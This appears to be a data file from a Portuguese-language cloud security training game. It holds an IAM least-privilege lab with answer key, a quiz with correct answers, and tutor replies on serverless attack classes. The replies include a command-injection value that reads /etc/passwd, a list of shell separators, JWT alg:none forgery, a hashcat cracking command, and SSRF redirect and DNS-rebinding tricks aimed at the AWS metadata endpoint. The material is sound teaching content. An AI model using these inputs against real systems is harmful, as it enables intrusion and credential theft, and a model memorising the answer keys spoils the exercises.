<span class="ln">17</span>        <span class="good">"Resource": "arn:aws:s3:::aegis-uploads-prod/input/*"</span>
<span class="ln">18</span>      },
<span class="ln">19</span>      {
<span class="ln">20</span>        <span class="str">"Effect"</span>: <span class="str">"Allow"</span>,
<span class="ln">21</span>        <span class="good">"Action": ["lambda:InvokeFunction"],</span>
<span class="ln">22</span>        <span class="cm">// Apenas a função downstream necessária</span>
<span class="ln">23</span>        <span class="good">"Resource": "arn:aws:lambda:us-east-1:ACCT:function:aegis-processor"</span>
<span class="ln">24</span>      }
<span class="ln">25</span>    ]
<span class="ln">26</span>  }
<span class="ln">27</span>
<span class="ln">28</span>  <span class="cm">// SCP na Organization — proteção acima do IAM</span>
<span class="ln">29</span>  <span class="good">// Bloqueia iam:CreatePolicy e iam:AttachRolePolicy</span>
<span class="ln">30</span>  <span class="good">// para todas as contas exceto a de segurança</span>`,
        aegisTip: 'Least privilege não é teoria. É cada Action com o Resource mínimo necessário. Resource:* em qualquer Action sensível é uma falha de design, não de implementação.',

        lab: {
          type: 'fillBlank',
          title: '// LAB 3 — Escreva a policy correta',
          description: 'Complete a IAM policy com least privilege. Cada blank fecha um vetor de escalada.',
          xpReward: 65,
          template: `{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["iam:PassRole"],
      // Apenas o role específico necessário
      "Resource": "arn:aws:iam::ACCT:role/___BLANK1___",
      "Condition": {
        "StringEquals": {
          // Limitar ao serviço que pode receber o role
          "iam:PassedToService": "___BLANK2___"
        }
      }
    },
    {
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      // ARN exato do bucket — sem wildcard *
      "Resource": "arn:aws:s3:::___BLANK3___/uploads/*"
    },
    {
      "Effect": "___BLANK4___",
      "Action": ["iam:CreatePolicy", "iam:AttachRolePolicy", "iam:CreateUser"],
      "Resource": "*"
    }
  ]
}`,
          blanks: [
            {
              id: 'BLANK1',
              label: 'Nome do role específico que pode ser passado (não um wildcard)',
              answer: 'allowed-execution-role',
              alternatives: ['specific-lambda-role', 'aegis-execution-role'],
              hint: 'Nunca usar * — isso permitiria passar AdminRole.',
            },
            {
              id: 'BLANK2',
              label: 'Serviço AWS que pode receber o role (formato: service.amazonaws.com)',
              answer: 'lambda.amazonaws.com',
              alternatives: [],
              hint: 'Restringir para qual serviço o role pode ser delegado.',
            },
            {
              id: 'BLANK3',
              label: 'Nome do bucket específico (sem wildcard de bucket)',
              answer: 'aegis-uploads-prod',
              alternatives: ['meu-bucket-prod'],
              hint: 'ARN de bucket específico, não arn:aws:s3:::*',
            },
            {
              id: 'BLANK4',
              label: 'Effect para bloquear criação de policies e users IAM',
              answer: 'Deny',
              alternatives: [],
              hint: 'Deny explícito bloqueia mesmo se outra policy Allow existir.',
            },
          ],
        },
      },

      {
        id: 5,
        title: 'checkpoint final — missão completa',
        aegisTip: 'Você completou as 6 missões. Command Injection → IDOR → Broken Auth → SSRF → Supply Chain → Privilege Escalation. Cada um comprometeu sistemas reais. Você agora sabe por quê.',
      },
    ],

    quiz: [
      {
        q: 'Por que iam:PassRole com Resource:"*" permite escalada de privilégios?',
        opts: [
          'Permite que a Lambda consuma memória de roles de outros serviços',
          'Permite delegar qualquer role existente na conta — incluindo roles com AdministratorAccess — para qualquer função criada',
          'Permite que a Lambda assuma temporariamente o role de admin via STS',
          'Expõe as credenciais dos roles listados via API pública',
        ],
        correct: 1,
        exp: 'iam:PassRole permite especificar qual role uma função executará. Com Resource:*, pode-se passar AdminRole para uma Lambda backdoor criada com lambda:CreateFunction. A backdoor então executa com AdministratorAccess.',
      },
      {
        q: 'O que diferencia uma SCP (Service Control Policy) de uma IAM Policy?',
        opts: [
          'SCPs se aplicam apenas a usuários root, IAM policies a usuários IAM comuns',
          'SCPs definem o máximo possível para qualquer entidade na conta/org — não podem ser sobrescritas por IAM policies mesmo com Allow explícito',
          'SCPs são para EC2, IAM policies para Lambda e outros serviços',
          'SCPs só bloqueiam serviços AWS, IAM policies controlam recursos individuais',
        ],
        correct: 1,
        exp: 'SCP é aplicada na AWS Organization e define o teto de permissões. Mesmo que uma IAM policy conceda iam:CreatePolicy Allow, se a SCP da org bloqueia, a ação é negada. É a última linha de defesa não contornável pelo admin da conta.',
      },
      {
        q: 'A Condition key "iam:PassedToService": "lambda.amazonaws.com" no iam:PassRole — o que garante?',
        opts: [
          'Que o role passado tenha "lambda" no nome',
          'Que o role só pode ser passado para o serviço Lambda — não para EC2, ECS, ou outros serviços',
          'Que a Lambda que recebe o role esteja na região us-east-1',
          'Que apenas o principal "lambda.amazonaws.com" pode assumir o role',
        ],
        correct: 1,
        exp: 'Sem essa Condition, iam:PassRole permite passar o role para qualquer serviço AWS — EC2, ECS, Glue. Com a Condition, apenas Lambda pode receber o role delegado. Isso reduz a surface de ataque mesmo se o Role ARN ainda for restrito.',
      },
      {
        q: 'lambda:UpdateFunctionCode sem restrição de Resource — qual é o vetor de ataque?',
        opts: [
          'Permite atualizar o runtime da função para uma versão vulnerável',
          'Permite substituir o código de qualquer função da conta — incluindo funções críticas de produção — com código malicioso',
          'Permite aumentar o timeout da função além do limite de 15 minutos',
          'Permite modificar as variáveis de ambiente de qualquer função',
        ],
        correct: 1,
        exp: 'Um atacante com lambda:UpdateFunctionCode Resource:* pode fazer upload de um zip com backdoor para substituir o código de qualquer função — prod-payment-processor, auth-handler, etc. A função legítima vira backdoor sem precisar criar uma nova.',
      },
      {
        q: 'IAM Access Analyzer detecta uma policy com iam:PassRole Resource:* e emite um finding. Qual é a natureza desse finding?',
        opts: [
          'Critical — escalada de privilégios é detectada automaticamente',
          'Unused access — o finding indica que o resource wildcard não foi usado',
          'External access — o finding indica que um recurso externo à conta tem acesso',
          'O Access Analyzer não detecta iam:PassRole Resource:* como finding',
        ],
        correct: 0,
        exp: 'IAM Access Analyzer (com Unused Access Analyzer ativado) detecta permissões excessivas incluindo iam:PassRole com Resource amplo. O finding é classificado com severidade alta pois é um vetor de escalada documentado. Também detecta via automated reasoning as combinações de Actions que permitem escalada.',
      },
    ],
  },
];

/* ═══════════════════════════════════════════════════════════
   BOT_ANSWERS — respostas do ÆGIS-BOT para quick replies
   Mesclar com BOT_ANSWERS do ai-router.js
═══════════════════════════════════════════════════════════ */
const MISSIONS_BOT_ANSWERS = {
  /* Command Injection */
  serverless:     `Funções que executam em resposta a eventos sem gerenciar servidores. AWS Lambda, Google Cloud Functions, Vercel Functions. Escalam automaticamente, mas cada invocação precisa validar input — não há middleware persistente.`,
  risk:           `Command Injection em Lambda: acesso ao IAM role da função. Isso significa credenciais AWS, acesso a S3, DynamoDB, SSM. Em minutos, a conta inteira pode ser comprometida via uma entrada não validada.`,
  example:        `filename=report.pdf → cmd = "ls -la /uploads/report.pdf" ✓<br>filename=x; cat /etc/passwd → cmd = "ls -la /uploads/x" + "cat /etc/passwd" ← executa os dois`,
  semi:           `; separa comandos no shell Unix. cmd1; cmd2 executa cmd2 independente do resultado de cmd1. && executa cmd2 apenas se cmd1 tiver sucesso. || executa cmd2 apenas se cmd1 falhar.`,
  chars:          `Separadores perigosos: <code>;</code> <code>&&</code> <code>||</code> <code>|</code> (pipe) <code>\`cmd\`</code> (backticks) <code>$(cmd)</code> (subshell) <code>%0a</code> (newline) <code>{cmd,}</code> (brace expansion)`,
  prod:           `Constantemente. OWASP Top 10 há 20 anos. Em 2021: log4shell afetou Apache Log4j via JNDI injection — variante de command injection. Qualquer input que chega ao shell sem validação é vulnerável.`,
  execfile:       `execFile('ls', ['-la', filename]) → executa /usr/bin/ls com argumentos como array. O OS recebe o array diretamente, sem shell intermediário. ; é um caractere literal no argumento, não um separador de comando.`,
  regex:          `Regex whitelist /^[\\w\\-\\.]+$/ cobre casos comuns. Mas não é suficiente sozinha — path.basename() é necessária para traversal. execFile() é necessário para eliminar o shell. Três camadas independentes.`,
  basename:       `path.basename('../../../etc/passwd') → 'passwd'. Remove todos os diretórios, retorna apenas o filename. path.join('/uploads', 'passwd') → '/uploads/passwd'. Sem traversal possível.`,
  /* IDOR */
  idor_what:      `IDOR: o servidor usa um ID fornecido pelo cliente para acessar dados sem verificar ownership. Você é user 42, troca para userId=1 na URL, recebe dados do admin. Autenticação passou — autorização nunca foi checada.`,
  authn_authz:    `Autenticação: provar quem você é (JWT, senha). Autorização: verificar se você pode (ownership, role, permissão sobre o recurso específico). IDOR é falha de autorização — o usuário está autenticado mas acessa o que não deveria.`,
  idor_real:      `Facebook 2019: endpoint de API retornava fotos de qualquer usuário por ID. Exposed 6.8M fotos. Instagram 2019: IDs sequenciais em stories. Uber 2016: drivers podiam acessar dados de outros drivers via ID no endpoint.`,
  jwt_what:       `JWT = Header.Payload.Signature em Base64. Header: algoritmo. Payload: dados (sub=userId, role, exp). Signature: HMAC(header.payload, secret). Apenas a signature prova autenticidade — o payload é público.`,
  http_codes:     `401 Unauthorized: não autenticado. O servidor não sabe quem você é. Retornar WWW-Authenticate.<br>403 Forbidden: autenticado mas sem permissão para esse recurso específico.<br>404 para não revelar existência do recurso a quem não tem acesso.`,
  access_models:  `RBAC: permissão por cargo (admin, editor, viewer). Simples, inflexível.<br>ABAC: permissão por atributos (owner, department, classification, time-of-day). Granular, poderoso.<br>Para IDOR: ABAC garante que user só acessa seus próprios recursos.`,
  idor_exploit:   `Testar IDOR: trocar IDs numéricos sequencialmente (1, 2, 3...). Trocar UUIDs entre contas de teste. Interceptar com Burp Suite e manipular parâmetros. Verificar se a response muda para IDs de outros usuários.`,
  /* JWT / Broken Auth */
  jwt_none:       `alg:none: modificar o header JWT para {"alg":"none"} e remover a signature. Algumas libs aceitam como válido. jwt.verify(token, secret, {algorithms:['HS256']}) rejeita imediatamente — 'none' não está na lista.`,
  jwt_brute:      `Secret 'secret' está no topo de qualquer wordlist (rockyou.txt, darkweb2017). hashcat -a 0 -m 16500 jwt.txt wordlist.txt quebra em segundos. Secret seguro: openssl rand -hex 32 — 256 bits de entropia real.`,
  jwt_secret:     `Gerar: <code>openssl rand -hex 32</code> ou <code>node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"</code>. Armazenar: AWS Secrets Manager ou SSM Parameter Store. Nunca no código, nunca no .env commitado.`,
  jwt_session:    `JWT: stateless, sem banco para sessão, escala bem. Problema: não revogável antes do exp sem denylist.<br>Session: stateful, revogável imediatamente. Precisa de storage compartilhado em microserviços.<br>Para Lambda: JWT (access 15min) + refresh token em HttpOnly cookie.`,
  jwt_refresh:    `Access token: curto (15min). Refresh token: longo (7 dias), HttpOnly cookie, em banco/Redis. Trocar refresh por novo access token. Logout = invalidar refresh no banco. Token vazado expira em 15min.`,
  jwt_storage:    `HttpOnly cookie: seguro contra XSS, precisa SameSite=Strict contra CSRF.<br>localStorage: acessível via XSS — nunca para tokens auth.<br>Regra: qualquer token que dá acesso → HttpOnly cookie. Não localStorage, não sessionStorage.`,
  /* SSRF */
  ssrf_what:      `SSRF: o atacante controla uma URL que o servidor vai buscar, acessando recursos internos inacessíveis diretamente. O servidor vira proxy do atacante contra sua própria infraestrutura.`,
  ssrf_meta:      `169.254.169.254 = Instance Metadata Service (IMDS) da AWS. Acessível de dentro de qualquer EC2/Lambda sem autenticação adicional. Retorna credenciais IAM temporárias completas. É o primeiro alvo de qualquer SSRF em AWS.`,
  ssrf_targets:   `Além do IMDS: localhost:8080 (painel admin interno), 10.0.x.x (rede interna), bancos de dados sem autenticação, Redis sem senha, Elasticsearch, outros microsserviços, consul/etcd (service discovery).`,
  ssrf_imds:      `IMDSv2 requer PUT para obter token de sessão, depois GET com o token. Dificulta SSRF simples. Mas chain de dois requests ainda funciona via SSRF que permite múltiplos requests. Ativar com: aws ec2 modify-instance-metadata-options --http-tokens required`,
  ssrf_redirect:  `Bypass de allowlist: evil.com está na allowlist, evil.com retorna HTTP 301 → http://169.254.169.254. Com redirect:follow (default), o fetch executa o redirect sem revalidar a allowlist. Solução: redirect:'manual' e rejeitar 3xx.`,
  ssrf_dns:       `DNS rebinding: evil.com resolve para 1.2.3.4 na verificação (passa). TTL=0 muda para 169.254.169.254 no fetch (poucos ms depois). TOCTOU vulnerability. Defesa: allowlist gerenciada de domínios confiáveis — não depender de resolução DNS para segurança.`,
  ssrf_allow:     `Allowlist: whitelist de domínios aprovados — rejeita tudo não listado. Blocklist: lista de IPs/domínios proibidos — sempre incompleta. Um encoding diferente, um redirect, DNS rebinding contornam blocklists. Allowlist é a única defesa robusta.`,
  ssrf_waf:       `WAF adiciona camada mas não é a defesa primária. Pode ser contornado por encodings, redirecionamentos, protocolos não cobertos. A defesa real é validação no código: allowlist + redirect:manual + sem HTTP ao metadata.`,
  /* Supply Chain */
  supply_what:    `Ataque que compromete dependências usadas pelo alvo. O atacante não invade seu sistema — compromete algo que você já confia (npm, PyPI, RubyGems, Maven). Seu build puxa o código malicioso automaticamente.`,
  supply_event:   `2018: event-stream (8M downloads/semana). Maintainer cansado transferiu para hacker. Adicionou dependência com backdoor para roubar carteiras de Bitcoin de um app específico (bitpay/copay). Detectado 5 semanas depois.`,
  supply_audit:   `npm audit verifica CVEs no banco de dados do npm. Falha silenciosa: não detecta malware sem CVE (novo ou sofisticado). Socket.dev detecta comportamento suspeito (network calls no install, obfuscação). Use ambos.`,
  supply_lock:    `package-lock.json trava versões exatas de todas as deps transitivas. Commitado no repo, garante que todos — dev, CI, produção — usam as mesmas versões. npm ci usa o lock, falha se divergir. npm install pode ignorar.`,
  supply_verify:  `Antes de instalar: verificar downloads (pacote com 10M downloads/semana vs 3), idade (criado há 2 dias = suspeito), maintainers, histórico de releases. Ferramentas: npq (interativo), Socket.dev, Snyk.`,
  supply_ci:      `npm install: pode atualizar dentro do semver, gera novo lockfile, pode introduzir versões novas.<br>npm ci: usa lockfile exato, falha se lockfile não existe ou diverge do package.json, mais rápido, reproducível. Sempre use npm ci em CI/CD.`,
  supply_snyk:    `Snyk: monitora em tempo real, detecta em sub-deps transitivas, sugere patches, alertas por email quando nova CVE afeta suas deps. Integra com GitHub PR checks. Tier gratuito para projetos open source.`,
  supply_sbom:    `SBOM (Software Bill of Materials): inventário de todas as deps com versões e licenças. Quando log4shell foi divulgado, empresas com SBOM levaram minutos para saber se eram afetadas. Sem SBOM: dias ou semanas. Gerar: cyclonedx-npm, syft.`,
  supply_post:    `postinstall legítimos existem (node-gyp para binários nativos). Risco: pacote comprometido usa postinstall para exfiltrar secrets do ambiente de build. --ignore-scripts desabilita todos. Verificar se alguma dep legítima quebra antes de ativar.`,
  supply_pipe:    `Pipeline mínimo: npm audit → socket check → npm ci --ignore-scripts → semgrep/CodeQL → testes → deploy. Cada step é um filtro independente. Problema detectado antes = problema que não chega à produção.`,
  /* Privilege Escalation */
  iam_passrole:   `iam:PassRole permite que uma entidade delegue um role para um serviço AWS. Com Resource:*, pode passar qualquer role da conta — incluindo AdministratorAccess — para Lambda, EC2, ECS. É o vetor mais comum de escalada em AWS.`,
  iam_lp:         `Least Privilege: cada entidade tem apenas as Actions necessárias para sua função, com Resources explícitos (ARN completo, não *). Auditar com IAM Access Analyzer. Revisar permissions quarterly. Remover permissions não usadas.`,
  iam_audit:      `Ferramentas: IAM Access Analyzer (findings automáticos), AWS Trusted Advisor (permissões excessivas), Access Advisor (last accessed), Credential Report (MFA, rotação de keys), CloudTrail (histórico completo de API calls).`,
  iam_conditions: `Condition keys restringem quando a permissão aplica: aws:RequestedRegion (região), aws:ResourceTag (tag), aws:CurrentTime (horário), aws:MultiFactorAuthPresent (MFA), iam:PassedToService (qual serviço recebe o role).`,
  iam_trail:      `CloudTrail loga todas as chamadas API incluindo iam:PassRole, lambda:CreateFunction, iam:CreatePolicy. Configurar EventBridge rules para alertar em tempo real para ações IAM sensíveis. Guardar logs em S3 com Object Lock (imutáveis).`,
  iam_analyzer:   `IAM Access Analyzer: analisa policies e identifica recursos acessíveis externamente, permissões não utilizadas (Unused Access), e findings de escalada potencial. Gratuito. Ativar em todas as regiões. Integrar com Security Hub.`,
  iam_scp:        `SCP (Service Control Policy) na AWS Organization define o máximo de permissões para qualquer conta. Sobrepõe IAM policies — nem o root da conta pode ultrapassar o SCP. Último recurso contra escalada catastrófica.`,
  iam_boundary:   `Permission Boundaries: definem o máximo de permissões que uma identidade pode ter, mesmo que a policy tente conceder mais. Útil para delegar criação de roles/users a outras equipes sem risco de escalada.`,
  review_all:     `As 6 missões do ÆGIS cobrem os vetores críticos de serverless e cloud security: Command Injection → IDOR → Broken Auth → SSRF → Supply Chain → Privilege Escalation. Cada um comprometeu sistemas reais em produção.`,
  season:         `Season 01 concluída. Você agora conhece os 6 vetores críticos e como defendê-los. Season 02 vai cobrir: Race Conditions, XXE, Deserialization, Container Escape, Kubernetes RBAC, e Zero-Day response.`,
};

/* Mesclar com BOT_ANSWERS do ai-router.js */
if (typeof BOT_ANSWERS !== 'undefined') {
  Object.assign(BOT_ANSWERS, MISSIONS_BOT_ANSWERS);
}